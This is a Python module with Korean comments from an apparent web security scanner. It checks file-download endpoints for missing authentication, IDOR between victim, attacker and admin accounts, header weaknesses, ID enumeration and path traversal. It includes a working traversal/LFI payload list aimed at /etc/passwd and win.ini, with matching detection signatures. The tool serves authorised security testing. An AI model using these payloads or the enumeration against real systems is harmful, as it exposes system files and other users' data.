"""다운로드 취약점 체크 모음.

download 설정 예:
  "download": {
    "url_template": "/download/{id}",   # {id} 치환
    "id_type": "int",
    "id_range": [1, 30],
    "traversal_template": "/download/{payload}"  # 경로순회 주입 지점(선택)
  }
동일 파일에 대해 두 계정(피해자/공격자)으로 접근 가능 여부를 실증한다.
"""
from urllib.parse import quote
from .client import Client
from .finding import (Finding, VULNERABLE, POTENTIAL, SAFE, INFO,
                      CRITICAL, HIGH, MEDIUM, LOW, SEV_INFO)

MARK = b"FIODLMARKER"

# 경로순회 / LFI 페이로드
TRAVERSAL = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....\\\\....\\\\windows\\win.ini",
    "file:///etc/passwd",
]
TRAVERSAL_SIGNS = (b"root:x:0:0", b"root:*:0:0", b"[fonts]", b"[extensions]",
                   b"for 16-bit app support")


def _upload_marker(cfg, auth, tag):
    """지정 계정으로 마커 첨부 업로드 → (client, download_path, content)."""
    c = Client(cfg["base_url"], verify_tls=cfg.get("verify_tls", True))
    if not c.login(auth):
        return None, None, None
    ups = cfg["upload"]
    content = MARK + f"-owner={_who(auth)}-{tag}".encode()
    resp = c.upload(ups, f"{tag}.txt", content, "text/plain",
                    extra_overrides={"title": f"fio-{tag}", "body": "fio"})
    regex = ups.get("download_link_regex")
    links = c.find_download_links(resp.text, regex)
    return c, (links[0] if links else None), content


def check_download_access(cfg) -> list[Finding]:
    """인증우회 / 수평 IDOR / 수직 권한상승."""
    findings = []
    victim_auth = cfg.get("auth")
    attacker_auth = cfg.get("attacker_auth")
    admin_auth = cfg.get("admin_auth")

    vclient, vpath, vcontent = _upload_marker(cfg, victim_auth, "victim")
    if not vpath:
        return [Finding(category="IDOR - Download", target_url=cfg["base_url"],
                        result="ERROR", severity=SEV_INFO,
                        evidence="피해자 마커 업로드 실패 - download 설정/인증 확인")]
    base_dl = vclient.url(vpath)

    # 1) 인증 우회
    anon = Client(cfg["base_url"], verify_tls=cfg.get("verify_tls", True))
    r = anon.get(vpath, allow_redirects=False)
    f = Finding(category="Missing Authentication (Download)", target_url=base_dl,
                method="GET", parameter="session", payload="(no cookie)",
                status_code=r.status_code,
                details={"location": r.headers.get("Location", "")})
    if r.status_code == 200 and MARK in r.content:
        f.result, f.severity = VULNERABLE, HIGH
        f.evidence = "로그인 없이 첨부 다운로드 성공"
    else:
        f.result, f.severity = SAFE, SEV_INFO
        f.evidence = f"미인증 차단(status={r.status_code})"
    findings.append(f)

    # 2) 수평 IDOR
    if attacker_auth:
        ac = Client(cfg["base_url"], verify_tls=cfg.get("verify_tls", True))
        if ac.login(attacker_auth):
            r = ac.get(vpath, allow_redirects=False)
            f = Finding(category="IDOR - Horizontal (Download)", target_url=base_dl,
                        method="GET", parameter=_param(cfg), payload=vpath,
                        status_code=r.status_code,
                        details={"victim": _who(victim_auth),
                                 "attacker": _who(attacker_auth)})
            if r.status_code == 200 and vcontent in r.content:
                f.result, f.severity = VULNERABLE, HIGH
                f.evidence = "타 사용자 세션으로 피해자 첨부 다운로드 성공(내용 일치) - 소유권 검증 부재"
            else:
                f.result, f.severity = SAFE, SEV_INFO
                f.evidence = f"타 사용자 접근 차단(status={r.status_code})"
            findings.append(f)

    # 3) 수직 권한상승 (관리자 파일을 일반사용자가)
    if admin_auth and attacker_auth:
        _, apath, acontent = _upload_marker(cfg, admin_auth, "adminsecret")
        if apath:
            ac = Client(cfg["base_url"], verify_tls=cfg.get("verify_tls", True))
            if ac.login(attacker_auth):
                r = ac.get(apath, allow_redirects=False)
                f = Finding(category="IDOR - Vertical / Privilege Escalation (Download)",
                            target_url=ac.url(apath), method="GET",
                            parameter=_param(cfg), payload=apath,
                            status_code=r.status_code,
                            details={"owner": _who(admin_auth),
                                     "attacker": _who(attacker_auth)})
                if r.status_code == 200 and acontent in r.content:
                    f.result, f.severity = VULNERABLE, HIGH
                    f.evidence = "일반 사용자가 관리자 첨부 다운로드 성공 - 권한 검증 부재"
                else:
                    f.result, f.severity = SAFE, SEV_INFO
                    f.evidence = f"관리자 파일 접근 차단(status={r.status_code})"
                findings.append(f)

    # 4) Content-Disposition / MIME 스니핑 (참고)
    r = vclient.get(vpath, allow_redirects=False)
    disp = r.headers.get("Content-Disposition", "")
    xcto = r.headers.get("X-Content-Type-Options", "")
    ct = r.headers.get("Content-Type", "")
    inline = disp == "" or disp.lower().startswith("inline")
    f = Finding(category="Content-Disposition Inline (XSS risk)", target_url=base_dl,
                method="GET", parameter="Content-Disposition", payload="",
                status_code=r.status_code,
                details={"content_type": ct, "disposition": disp,
                         "x_content_type_options": xcto})
    if inline:
        f.result, f.severity = POTENTIAL, MEDIUM
        f.evidence = "attachment 미강제 → 브라우저 inline 렌더 시 XSS 가능"
    else:
        f.result, f.severity = SAFE, SEV_INFO
        f.evidence = "attachment 강제(브라우저 렌더 방지)"
    findings.append(f)

    if not xcto or xcto.lower() != "nosniff":
        findings.append(Finding(
            category="MIME Sniffing (missing X-Content-Type-Options)",
            target_url=base_dl, method="GET", parameter="X-Content-Type-Options",
            status_code=r.status_code, result=POTENTIAL, severity=LOW,
            evidence="X-Content-Type-Options: nosniff 미설정 - MIME 스니핑 위험",
            details={"x_content_type_options": xcto or "(none)"}))

    return findings


def check_traversal(cfg) -> list[Finding]:
    """다운로드 파라미터에 경로순회/LFI 페이로드 주입."""
    dl = cfg.get("download", {})
    tpl = dl.get("traversal_template") or dl.get("url_template")
    if not tpl or "{" not in tpl:
        return []
    c = Client(cfg["base_url"], verify_tls=cfg.get("verify_tls", True))
    c.login(cfg.get("auth"))
    key = "payload" if "{payload}" in tpl else "id"
    findings = []
    for p in TRAVERSAL:
        path = tpl.replace("{payload}", quote(p, safe="%")).replace("{id}", quote(p, safe="%"))
        try:
            r = c.get(path, allow_redirects=False)
        except Exception as e:
            findings.append(Finding(category="Path Traversal (Download)",
                                    target_url=c.url(tpl), method="GET",
                                    parameter=key, payload=p, result="ERROR",
                                    severity=SEV_INFO, evidence=f"오류: {e}"))
            continue
        hit = any(s in r.content for s in TRAVERSAL_SIGNS)
        f = Finding(category="Path Traversal / LFI (Download)", target_url=c.url(path),
                    method="GET", parameter=key, payload=p,
                    status_code=r.status_code,
                    details={"body_snippet": r.text[:120]})
        if hit:
            f.result, f.severity = VULNERABLE, CRITICAL
            f.evidence = "경로순회로 서버 시스템 파일 내용 노출됨"
        else:
            f.result, f.severity = SAFE, SEV_INFO
            f.evidence = f"시스템 파일 노출 없음(status={r.status_code})"
        findings.append(f)
    return findings


def check_enumeration(cfg) -> list[Finding]:
    """순차 ID 열거 - 공격자 세션으로 범위 접근."""
    dl = cfg.get("download", {})
    tpl = dl.get("url_template")
    rng = dl.get("id_range")
    if not tpl or "{id}" not in tpl or not rng:
        return []
    auth = cfg.get("attacker_auth") or cfg.get("auth")
    c = Client(cfg["base_url"], verify_tls=cfg.get("verify_tls", True))
    c.login(auth)
    accessible = []
    for i in range(rng[0], rng[1] + 1):
        path = tpl.replace("{id}", str(i))
        try:
            r = c.get(path, allow_redirects=False)
        except Exception:
            continue
        if r.status_code == 200 and r.content:
            accessible.append(i)
    f = Finding(category="IDOR - Enumeration (Download)",
                target_url=c.url(tpl), method="GET", parameter="id",
                payload=f"{rng[0]}..{rng[1]}",
                status_code=200,
                details={"range": rng, "accessible_ids": accessible,
                         "accessible_count": len(accessible),
                         "as_user": _who(auth)})
    if len(accessible) > 1:
        f.result, f.severity = VULNERABLE, HIGH
        f.evidence = f"순차 ID 열거로 {len(accessible)}개 파일 접근 가능 - 추측가능 식별자+인가 부재"
    elif accessible:
        f.result, f.severity = INFO, SEV_INFO
        f.evidence = "본인 파일만 접근 가능(정상 범위)"
    else:
        f.result, f.severity = SAFE, SEV_INFO
        f.evidence = "접근 가능한 파일 없음"
    return [f]


def _param(cfg):
    tpl = cfg.get("download", {}).get("url_template", "")
    return "id" if "{id}" in tpl else "path"


def _who(auth):
    if not auth or not auth.get("fields"):
        return "anon"
    fields = auth["fields"]
    k = list(fields)[0]
    return fields[k]


def run(cfg) -> list[Finding]:
    out = []
    out += check_download_access(cfg)
    out += check_traversal(cfg)
    out += check_enumeration(cfg)
    return out
